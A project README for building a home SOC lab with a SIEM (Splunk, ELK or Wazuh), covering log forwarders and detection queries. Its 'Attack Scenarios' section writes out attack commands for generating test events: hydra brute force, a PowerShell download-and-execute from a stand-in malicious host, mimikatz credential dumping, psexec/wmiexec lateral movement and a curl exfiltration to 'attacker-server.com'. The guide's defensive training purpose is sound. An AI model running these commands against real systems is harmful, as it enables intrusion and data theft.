# Home SOC Lab with SIEM Deployment

## Table of Contents

1. [Project Overview](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#project-overview)
2. [Lab Architecture](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#lab-architecture)
3. [Prerequisites](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#prerequisites)
4. [Installation & Setup](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#installation--setup)
5. [SIEM Configuration](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#siem-configuration)
6. [Attack Scenarios](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#attack-scenarios)
7. [Log Analysis](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#log-analysis)
8. [Troubleshooting](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#troubleshooting)
9. [References](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#references)

---

## Project Overview

### Purpose

This home Security Operations Center (SOC) lab provides a controlled environment for:

- Learning SIEM deployment and configuration
- Practicing log analysis and threat detection
- Simulating real-world attack scenarios
- Developing incident response skills

### Goals

- Deploy a fully functional SIEM solution
- Configure comprehensive log collection from multiple sources
- Generate and analyze security events
- Document detection rules and playbooks

---

## Lab Architecture

### Network Diagram

```
┌─────────────────────────────────────────────────────────┐
│                    Host Machine                         │
│                                                          │
│  ┌────────────┐  ┌────────────┐  ┌──────────────┐     │
│  │   SIEM     │  │  Windows   │  │    Linux     │     │
│  │  Server    │  │   Client   │  │   Client     │     │
│  │ (Splunk/   │  │            │  │              │     │
│  │  ELK/      │  │            │  │              │     │
│  │ Wazuh)     │  │            │  │              │     │
│  └────────────┘  └────────────┘  └──────────────┘     │
│        │               │                │              │
│        └───────────────┴────────────────┘              │
│                  Virtual Network                        │
│                (192.168.100.0/24)                       │
└─────────────────────────────────────────────────────────┘
```

### Components

|Component|Role|IP Address|OS|
|---|---|---|---|
|SIEM Server|Log aggregation & analysis|192.168.100.10|Ubuntu 22.04|
|Windows Client|Log source & attack target|192.168.100.20|Windows 10/11|
|Linux Client|Log source & attack target|192.168.100.30|Ubuntu 22.04|
|Kali Linux (Optional)|Attack machine|192.168.100.40|Kali Linux|

---

## Prerequisites

### Hardware Requirements

- **CPU**: 4+ cores (8+ recommended)
- **RAM**: 16GB minimum (32GB recommended)
- **Storage**: 100GB+ free space
- **Network**: Virtualization support (VT-x/AMD-V)

### Software Requirements

- **Hypervisor**: VMware Workstation, VirtualBox, or Hyper-V
- **Operating Systems**:
    - Ubuntu Server 22.04 ISO
    - Windows 10/11 ISO
    - Kali Linux ISO (optional)

### Knowledge Prerequisites

- Basic Linux command line
- Understanding of networking concepts
- Familiarity with virtualization

---

## Installation & Setup

### Step 1: Hypervisor Setup

#### VirtualBox Installation

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install virtualbox virtualbox-ext-pack

# macOS
brew install --cask virtualbox
```

#### VMware Workstation (Alternative)

Download from VMware website and follow installation wizard.

### Step 2: Network Configuration

#### Create Virtual Network

1. Open your hypervisor's network settings
2. Create a new NAT or Host-Only network
3. Configure subnet: `192.168.100.0/24`
4. Enable DHCP (optional) or use static IPs

**VirtualBox Example:**

```bash
VBoxManage natnetwork add --netname SOCLabNet --network "192.168.100.0/24" --enable
```

### Step 3: SIEM Server Deployment

#### Option A: Splunk Enterprise (Free License)

**VM Specifications:**

- 4 vCPUs
- 8GB RAM
- 50GB storage

**Installation Steps:**

```bash
# 1. Download Splunk
wget -O splunk.tgz 'https://download.splunk.com/products/splunk/releases/[VERSION]/linux/splunk-[VERSION]-Linux-x86_64.tgz'

# 2. Extract and install
sudo tar xvzf splunk.tgz -C /opt/

# 3. Start Splunk
sudo /opt/splunk/bin/splunk start --accept-license

# 4. Enable boot-start
sudo /opt/splunk/bin/splunk enable boot-start
```

**Access:** `http://192.168.100.10:8000` **Default credentials:** admin / changeme (change on first login)

#### Option B: Elastic Stack (ELK)

**Installation Steps:**

```bash
# 1. Install Elasticsearch
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
sudo apt update && sudo apt install elasticsearch

# 2. Install Kibana
sudo apt install kibana

# 3. Install Logstash
sudo apt install logstash

# 4. Start services
sudo systemctl enable elasticsearch kibana logstash
sudo systemctl start elasticsearch kibana logstash
```

**Access:** `http://192.168.100.10:5601`

#### Option C: Wazuh

**Installation Steps:**

```bash
# Quick installation
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash ./wazuh-install.sh -a
```

**Access:** `https://192.168.100.10`

### Step 4: Windows Client Setup

1. Create Windows 10/11 VM
    
    - 2 vCPUs, 4GB RAM, 50GB storage
    - Connect to SOCLabNet network
2. Configure static IP:
    
    ```powershell
    New-NetIPAddress -IPAddress 192.168.100.20 -PrefixLength 24 -DefaultGateway 192.168.100.1 -InterfaceAlias "Ethernet"
    ```
    
3. Install Sysmon for enhanced logging:
    
    ```powershell
    # Download Sysmon
    Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "Sysmon.zip"
    Expand-Archive Sysmon.zip
    
    # Download SwiftOnSecurity config
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "sysmonconfig.xml"
    
    # Install with config
    .\Sysmon64.exe -accepteula -i sysmonconfig.xml
    ```
    

### Step 5: Linux Client Setup

1. Create Ubuntu 22.04 VM
    
    - 2 vCPUs, 2GB RAM, 25GB storage
2. Configure static IP:
    
    ```bash
    sudo nano /etc/netplan/00-installer-config.yaml
    ```
    
    ```yaml
    network:
      ethernets:
        ens33:
          addresses:
            - 192.168.100.30/24
          gateway4: 192.168.100.1
          nameservers:
            addresses: [8.8.8.8, 8.8.4.4]
      version: 2
    ```
    
    ```bash
    sudo netplan apply
    ```
    
3. Install auditd for system auditing:
    
    ```bash
    sudo apt update
    sudo apt install auditd audispd-plugins
    sudo systemctl enable auditd
    sudo systemctl start auditd
    ```
    

---

## SIEM Configuration

### Log Collection Setup

#### For Splunk

**Windows Universal Forwarder:**

```powershell
# Install Universal Forwarder on Windows client
msiexec.exe /i splunkforwarder.msi DEPLOYMENT_SERVER="192.168.100.10:8089" AGREETOLICENSE=Yes /quiet

# Configure inputs
$InputsConf = @"
[WinEventLog://Security]
disabled = 0
renderXml = true

[WinEventLog://System]
disabled = 0

[WinEventLog://Application]
disabled = 0

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
renderXml = true
"@

$InputsConf | Out-File "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"
```

**Linux Universal Forwarder:**

```bash
# Install forwarder
wget -O splunkforwarder.tgz 'https://download.splunk.com/products/universalforwarder/releases/[VERSION]/linux/splunkforwarder-[VERSION]-Linux-x86_64.tgz'
sudo tar xvzf splunkforwarder.tgz -C /opt/

# Start and configure
sudo /opt/splunkforwarder/bin/splunk start --accept-license
sudo /opt/splunkforwarder/bin/splunk add forward-server 192.168.100.10:9997
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/syslog
```

#### For ELK Stack

**Filebeat on Windows:**

```powershell
# Download and install Filebeat
# Configure filebeat.yml
@"
filebeat.inputs:
- type: winlogbeat
  enabled: true
  event_logs:
    - name: Security
    - name: System
    - name: Application
    - name: Microsoft-Windows-Sysmon/Operational

output.elasticsearch:
  hosts: ["192.168.100.10:9200"]
  
setup.kibana:
  host: "192.168.100.10:5601"
"@ | Out-File "C:\Program Files\Filebeat\filebeat.yml"
```

**Filebeat on Linux:**

```bash
sudo apt install filebeat

# Configure
sudo nano /etc/filebeat/filebeat.yml
```

```yaml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/auth.log
    - /var/log/syslog
    - /var/log/audit/audit.log

output.elasticsearch:
  hosts: ["192.168.100.10:9200"]

setup.kibana:
  host: "192.168.100.10:5601"
```

```bash
sudo systemctl enable filebeat
sudo systemctl start filebeat
```

### Creating Detection Rules

#### Splunk Detection Examples

**Failed Login Attempts:**

```spl
index=windows EventCode=4625
| stats count by Account_Name, src_ip
| where count > 5
```

**Suspicious Process Creation:**

```spl
index=sysmon EventCode=1
| search (Image="*\\powershell.exe" OR Image="*\\cmd.exe")
  (CommandLine="*-enc*" OR CommandLine="*IEX*" OR CommandLine="*DownloadString*")
```

#### ELK Detection Examples

**Failed SSH Logins:**

```json
{
  "query": {
    "bool": {
      "must": [
        { "match": { "event.action": "ssh_login" }},
        { "match": { "event.outcome": "failure" }}
      ]
    }
  },
  "aggs": {
    "by_source": {
      "terms": { "field": "source.ip" }
    }
  }
}
```

---

## Attack Scenarios

### Scenario 1: Brute Force Attack

**Objective:** Detect SSH/RDP brute force attempts

**Execution:**

```bash
# From Kali Linux or another system
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.30

# For RDP
hydra -l administrator -P passwords.txt rdp://192.168.100.20
```

**Expected Logs:**

- Multiple failed authentication events (EventID 4625 on Windows)
- Multiple failed SSH attempts in /var/log/auth.log on Linux

**Detection Query (Splunk):**

```spl
index=* (EventCode=4625 OR "Failed password")
| stats count by src_ip, user
| where count > 10
```

### Scenario 2: Malicious PowerShell Execution

**Objective:** Detect obfuscated or encoded PowerShell commands

**Execution:**

```powershell
# On Windows client, execute encoded command
powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==

# Download and execute
powershell.exe -command "IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload')"
```

**Expected Logs:**

- Sysmon EventID 1 (Process Creation)
- PowerShell Operational logs (EventID 4104)

**Detection Query:**

```spl
index=sysmon EventCode=1 Image="*powershell.exe"
(CommandLine="*-enc*" OR CommandLine="*-e *" OR CommandLine="*IEX*" OR CommandLine="*DownloadString*")
```

### Scenario 3: Privilege Escalation

**Objective:** Detect attempts to escalate privileges

**Execution (Linux):**

```bash
# Attempt to exploit sudo
sudo -l
sudo su -

# Check for SUID binaries
find / -perm -4000 2>/dev/null
```

**Execution (Windows):**

```powershell
# Check privileges
whoami /priv

# Attempt to access LSASS
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

**Detection Query:**

```spl
index=* (EventCode=4672 OR "sudo:" OR "COMMAND=su")
| stats count by user, src_host
```

### Scenario 4: Lateral Movement

**Objective:** Detect lateral movement attempts

**Execution:**

```bash
# SMB enumeration
crackmapexec smb 192.168.100.0/24

# PSExec usage
psexec.py domain/user:password@192.168.100.20

# WMI execution
wmiexec.py domain/user:password@192.168.100.20
```

**Expected Logs:**

- EventID 4688 (Process Creation)
- EventID 4624 (Logon Type 3)
- Network connection logs

**Detection Query:**

```spl
index=windows EventCode=4688
(NewProcessName="*psexec*" OR NewProcessName="*wmic.exe*")
| table _time, Computer, User, NewProcessName, CommandLine
```

### Scenario 5: Data Exfiltration

**Objective:** Detect unusual outbound data transfers

**Execution:**

```bash
# Large file upload simulation
curl -X POST -F "file=@sensitive_data.zip" http://attacker-server.com/upload

# DNS tunneling simulation
dnscat2
```

**Expected Logs:**

- Large outbound network connections
- Unusual DNS queries
- Process network activity

**Detection Query:**

```spl
index=* sourcetype=firewall
| stats sum(bytes_out) as total_bytes by src_ip, dest_ip
| where total_bytes > 100000000
```

---

## Log Analysis

### Key Event IDs to Monitor

#### Windows Security Events

|Event ID|Description|Severity|
|---|---|---|
|4624|Successful logon|Info|
|4625|Failed logon|Warning|
|4672|Special privileges assigned|High|
|4688|Process creation|Info|
|4697|Service installed|High|
|4720|User account created|Medium|
|4728|Member added to security group|High|

#### Sysmon Events

|Event ID|Description|Use Case|
|---|---|---|
|1|Process creation|Malware execution|
|3|Network connection|C2 communication|
|7|Image loaded|DLL injection|
|10|Process access|Credential dumping|
|11|File created|Ransomware activity|

#### Linux Auth Logs

- Failed sudo attempts
- SSH key authentication failures
- User additions/modifications
- Privilege escalation events

### Analysis Workflow

1. **Baseline Normal Activity**
    
    - Document typical user behavior
    - Identify normal process executions
    - Map regular network connections
2. **Create Correlation Rules**
    
    - Multiple failed logins followed by success
    - Unusual process parent-child relationships
    - Rare commands executed by common users
3. **Set Up Alerts**
    
    - Real-time notifications for high-severity events
    - Daily reports for medium-severity events
    - Weekly reviews of all detected anomalies
4. **Incident Response Process**
    
    ```
    Detection → Triage → Analysis → Containment → Eradication → Recovery → Lessons Learned
    ```
    

---

## Troubleshooting

### Common Issues

**Forwarders Not Sending Data:**

```bash
# Check forwarder status (Splunk)
/opt/splunkforwarder/bin/splunk list forward-server

# Check connection
telnet 192.168.100.10 9997

# Review logs
tail -f /opt/splunkforwarder/var/log/splunk/splunkd.log
```

**High Resource Usage:**

- Reduce log retention period
- Filter unnecessary logs at source
- Increase SIEM server resources

**Missing Events:**

- Verify forwarder configuration
- Check firewall rules between systems
- Ensure proper time synchronization (NTP)

**Network Connectivity Issues:**

```bash
# Test connectivity
ping 192.168.100.10

# Check routing
ip route

# Verify firewall rules
sudo ufw status
```

---

## References

### Documentation

- [Splunk Documentation](https://docs.splunk.com/)
- [Elastic Stack Documentation](https://www.elastic.co/guide/)
- [Wazuh Documentation](https://documentation.wazuh.com/)
- [Sysmon Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

### Attack Frameworks

- [MITRE ATT&CK](https://attack.mitre.org/)
- [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)

### Learning Resources

- [SANS Reading Room](https://www.sans.org/reading-room/)
- [Splunk Security Essentials](https://splunkbase.splunk.com/app/3435/)
- [Blue Team Labs Online](https://blueteamlabs.online/)

---

## Contributing

Contributions are welcome! Please submit pull requests with:

- New attack scenarios
- Improved detection rules
- Additional SIEM configurations
- Documentation improvements

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Acknowledgments

Special thanks to the cybersecurity community for sharing knowledge and tools that make projects like this possible.